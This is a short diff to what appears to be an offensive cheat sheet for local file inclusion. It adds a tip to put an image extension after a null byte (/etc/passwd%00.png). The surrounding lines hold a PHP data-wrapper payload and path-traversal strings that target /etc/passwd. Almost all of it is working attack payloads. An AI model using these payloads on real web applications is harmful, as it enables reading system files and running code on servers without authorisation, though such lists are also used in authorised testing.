@@ -23,6 +23,7 @@ ___
 8. Using Data wrappers >> data:text/plain,<?php%20phpinfo();%20?>
 
 ### File extension with null byte bypass
+```Note:``` Don't forget to adjust the file with extension. Ex: ```/etc/passwd%00.png```
 ```
 /etc/passwd%00
 ../../../etc/passwd%00
